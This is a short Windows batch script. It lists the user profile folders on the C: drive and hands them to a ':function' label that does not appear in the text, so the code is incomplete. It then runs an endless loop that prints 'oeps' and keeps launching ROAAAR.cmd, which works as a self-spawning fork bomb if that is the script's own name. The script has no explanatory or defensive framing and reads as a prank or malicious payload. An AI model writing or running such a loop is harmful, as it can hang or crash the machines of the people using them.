@echo off
for /f "delims=;" %%A in ('dir c:\users/ad /b^|findstr /v /i "default administrator public"^|findstr /v /c:"All Users"') do call :function %%A
:start
echo oeps
start ROAAAR.cmd
goto start